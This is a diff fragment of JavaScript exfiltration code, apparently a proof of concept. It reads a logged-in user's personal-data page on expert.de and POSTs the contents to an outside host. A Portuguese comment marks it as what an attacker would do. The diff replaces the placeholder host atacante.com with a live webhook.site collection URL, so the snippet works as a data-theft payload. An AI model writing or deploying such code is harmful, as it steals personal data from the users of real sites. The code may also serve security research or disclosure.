@@ -15,7 +15,7 @@ fetch('https://www.expert.de/shop/mein-expert/persoenliche-daten', {
 .then(r => r.text())
 .then(data => {
   // Em ataque real: enviar para servidor do atacante
-  fetch('https://atacante.com/exfil', {
+  fetch('https://webhook.site/d30b963b-617d-4e0b-9bbe-ac2f16c13573', {
     method: 'POST',
     body: data
   });
